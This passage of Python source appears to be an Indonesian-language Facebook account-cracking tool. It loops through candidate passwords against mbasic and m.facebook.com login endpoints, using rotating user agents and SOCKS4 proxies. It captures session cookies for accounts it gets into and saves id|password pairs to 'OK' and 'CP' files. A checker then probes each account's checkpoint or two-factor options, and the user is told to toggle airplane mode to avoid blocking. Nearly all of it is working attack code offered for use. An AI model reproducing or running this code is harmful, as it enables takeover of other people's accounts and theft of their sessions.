			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				cpngab = f'[➣] NAMA : {nmf}\n[➣] ID FACEBOOK : {idf}\n[➣] PASSWORD : {pw}'
				cpgan = nel(cpngab, style='white')
				panjihitam(nel(cpgan, title='[bold red][[bold yellow]CHECKPOINT[bold red]]'))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('\n')
				okengab = f'[➣] NAMA : {nmf}\n[➣] ID FACEBOOK : {idf}\n[➣] PASSWORD : {pw}\n[➣] COOKIES  : {kuki}'
				okegan = nel(okengab, style='white')
				panjihitam(nel(okegan, title='[bold red][[bold green]LIVE - OK[bold red]]'))
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(61)
	loop+=1

#--------------------[ METODE MBASIC ]-----------------#
def cracktouch(idf,pwv,nmf):
	global loop,ok,cp
	animasi = random.choice(["\x1b[1;91m🕧","\x1b[1;92m🕐","\x1b[1;93m🕑","\x1b[1;94m🕒","\x1b[1;95m🕓","\x1b[1;96m🕔","\x1b[1;97m🕕","\x1b[1;91m🕖","\x1b[1;92m🕗","\x1b[1;93m🕘","\x1b[1;94m🕙","\x1b[1;95m🕚","\x1b[1;96m🕛"])
	sys.stdout.write(f"\r {animasi} {P}[{M}{loop}{N}/{M}{len(id)}{P}] {P}[{H}OK:{ok}{P}] {P}[{M}CP:{cp}{P}] [{H}{'{:.0%}'.format(loop/float(len(id)))}{P}]"),
	sys.stdout.flush()
	nip=random.choice(prox)
	proxs= {'http': 'socks4://'+nip}
	ua = random.choice(ugent)
	ua2 = random.choice(ugent2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://"+cebok+"/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])            
			heade={'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://'+cebok,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = session.post('https://'+cebok+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				cpngab = f'[➣] NAMA : {nmf}\n[➣] ID FACEBOOK : {idf}\n[➣] PASSWORD : {pw}'
				cpgan = nel(cpngab, style='white')
				panjihitam(nel(cpgan, title='[bold red][[bold yellow]CHECKPOINT[bold red]]'))
				os.popen('play-audio data/cp.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('\n')
				okengab = f'[➣] NAMA : {nmf}\n[➣] ID FACEBOOK : {idf}\n[➣] PASSWORD : {pw}\n[➣] COOKIES  : {kuki}'
				okegan = nel(okengab, style='white')
				panjihitam(nel(okegan, title='[bold red][[bold green]LIVE - OK[bold red]]'))
				os.popen('play-audio data/ok.mp3')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(61)
	loop+=1

#--------------------[ CHECKER ]-----------------#
def ceker(idf,pw):
	global cp
	ua = ' Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/537.36 (KHTML, like Gecko; Mediapartners-Google) Chrome/102.0.5005.61 Mobile Safari/537.36'
	head = {"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://m.facebook.com')
		ho = sop(ses.post('https://m.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://m.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/M%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/M)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1

#--------------------[ OPSI ]-----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	panjihitam(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'=>'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = ' Mozilla/5.0 (Linux; Android 5.0.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/49.0.829.0 Safari/535.1'
			ses = requests.Session()
			header = {"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://m.facebook.com')
			ho = sop(ses.post('https://m.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://m.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
	
if __name__=='__main__':
	os.system('clear');loading()
	try:os.system('git pull')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	login()
	